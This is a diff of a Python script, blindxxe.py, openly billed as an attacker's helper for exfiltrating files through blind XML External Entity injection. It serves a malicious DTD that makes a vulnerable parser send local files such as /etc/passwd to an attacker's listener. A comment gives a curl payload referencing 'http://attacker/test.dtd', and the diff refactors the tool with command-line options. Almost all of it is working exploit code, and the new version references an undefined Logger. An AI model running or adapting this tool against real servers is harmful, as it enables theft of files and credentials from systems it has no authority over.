@@ -11,24 +11,24 @@
 # 0. Configure global variables: SERVER_SOCKET and RHOST
 #
 # 1. Run the below script, using:
-#	$ python blindxxe.py <filepath>
+#   $ python blindxxe.py [options] <filepath>
 #
-#	where <filepath> can be for instance: "file:///etc/passwd"
+#   where <filepath> can be for instance: "file:///etc/passwd"
 #
 # 2. Then, while server is running - invoke XXE by requesting e.g.
-#	$ curl -X POST http://vulnerable/app --data-binary \
-#		$'<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker/test.dtd"><foo>&exfil;</foo>'
+#   $ curl -X POST http://vulnerable/app --data-binary \
+#       $'<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker/test.dtd"><foo>&exfil;</foo>'
 #
 # The expected result will be like the following:
 #
 # $ python blindxxe.py 
-# 	Exfiltrated file:///etc/passwd:
-# 	------------------------------
-# 	root:x:0:0:root:/root:/bin/sh
-# 	nobody:x:65534:65534:nobody:/nonexistent:/bin/false
-# 	user:x:1000:50:Linux User,,,:/home/user:/bin/sh
-# 	play:x:100:65534:Linux User,,,:/var/www/play/:/bin/false
-# 	mysql:x:101:65534:Linux User,,,:/home/mysql:/bin/false
+#   Exfiltrated file:///etc/passwd:
+#   ------------------------------
+#   root:x:0:0:root:/root:/bin/sh
+#   nobody:x:65534:65534:nobody:/nonexistent:/bin/false
+#   user:x:1000:50:Linux User,,,:/home/user:/bin/sh
+#   play:x:100:65534:Linux User,,,:/var/www/play/:/bin/false
+#   mysql:x:101:65534:Linux User,,,:/home/mysql:/bin/false
 #
 #
 # Mariusz B., 2016
@@ -40,81 +40,134 @@ import urllib
 import re
 import sys
 import time
-import threading
 import socket
+import argparse
+import threading
 
 #
 # CONFIGURE THE BELOW VARIABLES
 #
 
-SERVER_SOCKET 	= ('0.0.0.0', 8000)
-EXFIL_FILE 		= 'file:///etc/passwd'
-
-# The host on which you will run this server
-RHOST 			= '192.168.56.1:' + str(SERVER_SOCKET[1])
-
+config = {
+    'debug' : '',
+    'listen' : '0.0.0.0',
+    'port' : 8080,
+    'rhost' : '',
+    'exfil-file' : '',
+}
 
 EXFILTRATED_EVENT = threading.Event()
 
 class BlindXXEServer(BaseHTTPRequestHandler):
 
-	def response(self, **data):
-		code = data.get('code', 200)
-		content_type = data.get('content_type', 'text/plain')
-		body = data.get('body', '')
+    def response(self, **data):
+        code = data.get('code', 200)
+        content_type = data.get('content_type', 'text/plain')
+        body = data.get('body', '')
 
-		self.send_response(code)
-		self.send_header('Content-Type', content_type)
-		self.end_headers()
-		self.wfile.write(body.encode('utf-8'))
-		self.wfile.close()
+        self.send_response(code)
+        self.send_header('Content-Type', content_type)
+        self.end_headers()
+        self.wfile.write(body.encode('utf-8'))
+        self.wfile.close()
 
-	def do_GET(self):
-		self.request_handler(self)
+    def do_GET(self):
+        self.request_handler(self)
 
-	def do_POST(self):
-		self.request_handler(self)
+    def do_POST(self):
+        self.request_handler(self)
 
-	def log_message(self, format, *args):
-		return
+    def log_message(self, format, *args):
+        return
 
-	def request_handler(self, request):
-		global EXFILTRATED_EVENT
+    def request_handler(self, request):
+        global EXFILTRATED_EVENT
 
-		path = urllib.unquote(request.path).decode('utf8')
-		m = re.search('\/\?exfil=(.*)', path, re.MULTILINE)
-		if m and request.command.lower() == 'get':
-			data = path[len('/?exfil='):]
-			print 'Exfiltrated %s:' % EXFIL_FILE
-			print '-' * 30
-			print urllib.unquote(data).decode('utf8')
-			print '-' * 30 + '\n'
-			self.response(body='true')
+        path = urllib.unquote(request.path).decode('utf8')
+        m = re.search('\/\?exfil=(.*)', path, re.MULTILINE)
+        if m and request.command.lower() == 'get':
+            data = path[len('/?exfil='):]
+            print 'Exfiltrated %s:' % EXFIL_FILE
+            print '-' * 30
+            print urllib.unquote(data).decode('utf8')
+            print '-' * 30 + '\n'
+            self.response(body='true')
 
-			EXFILTRATED_EVENT.set()
+            EXFILTRATED_EVENT.set()
 
-		elif request.path.endswith('.dtd'):
-			#print '[DEBUG] Sending malicious DTD file.'
-			dtd = '''<!ENTITY %% param_exfil SYSTEM "%(exfil_file)s">
+        elif request.path.endswith('.dtd'):
+            #print '[DEBUG] Sending malicious DTD file.'
+            dtd = '''<!ENTITY %% param_exfil SYSTEM "%(exfil_file)s">
 <!ENTITY %% param_request "<!ENTITY exfil SYSTEM 'http://%(exfil_host)s/?exfil=%%param_exfil;'>">
-%%param_request;''' % {'exfil_file' : EXFIL_FILE, 'exfil_host' : RHOST}
+%%param_request;''' % {'exfil_file' : config['exfil-file'], 'exfil_host' : config['rhost']}
 
-			self.response(content_type='text/xml', body=dtd)
+            self.response(content_type='text/xml', body=dtd)
 
-		else:
-			#print '[INFO] %s %s' % (request.command, request.path)
-			self.response(body='false')
+        else:
+            #print '[INFO] %s %s' % (request.command, request.path)
+            self.response(body='false')
 
-def main():
-	server = HTTPServer(SERVER_SOCKET, BlindXXEServer)
-	thread = threading.Thread(target=server.serve_forever)
-	thread.daemon = True
-	thread.start()
 
-	while not EXFILTRATED_EVENT.is_set():
-		pass
+def parseOptions(argv):
+    global config
+
+    print('''
+        :: Blind-XXE attacker's helper backend component
+        Helps exfiltrate files by abusing out-of-bands XML External Entity vulnerabilities.
+        Mariusz B. / mgeeky '16-18, <mb@binary-offensive.com>
+''')
+
+    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <file>')
+
+    parser.add_argument('file', type=str, metavar='FILE', default='file:///etc/passwd', help = 'Specifies file to exfiltrate using Blind XXE technique.')
+    parser.add_argument('-l', '--listen', default='0.0.0.0', help = 'Specifies interface address to bind the HTTP server on / listen on. Default: 0.0.0.0 (all interfaces)')
+    parser.add_argument('-p', '--port', metavar='PORT', default='8080', type=int, help='Specifies the port to listen on. Default: 8080')
+    parser.add_argument('-r', '--rhost', metavar='HOST', default=config['rhost'], help='Specifies attackers host address where the victim\'s XML parser should refer while fetching external entities')
+
+    parser.add_argument('-d', '--debug', action='store_true', help='Display debug output.')
+
+    args = parser.parse_args()
+
+    config['debug'] = args.debug
+    config['listen'] = args.listen
+    config['port'] = int(args.port)
+    config['rhost'] = args.rhost
+    config['exfil-file'] = args.file
+
+    port = int(args.port)
+    if port < 1 or port > 65535:
+        Logger.err("Invalid port number. Must be in <1, 65535>")
+        sys.exit(-1)
+
+    return args
+
+def fetchRhost():
+    global config
+    config['rhost'] = socket.gethostbyname(socket.gethostname())
+
+def main(argv):
+    global config
+
+    fetchRhost()
+
+    opts = parseOptions(argv)
+    if not opts:
+        Logger.err('Options parsing failed.')
+        return False
+
+    print('[+] Serving HTTP server on: ("{}", {})'.format(
+        config['listen'], config['port']
+    ))
+
+    server = HTTPServer((config['listen'], config['port']), BlindXXEServer)
+    thread = threading.Thread(target=server.serve_forever)
+    thread.daemon = True
+    thread.start()
+
+    while not EXFILTRATED_EVENT.is_set():
+        pass
+
+    print('[+] File has been exfiltrated. Quitting.')
 
 if __name__ == '__main__':
-	if len(sys.argv) > 1:
-		EXFIL_FILE = sys.argv[1]
-	main()
+    main(sys.argv)
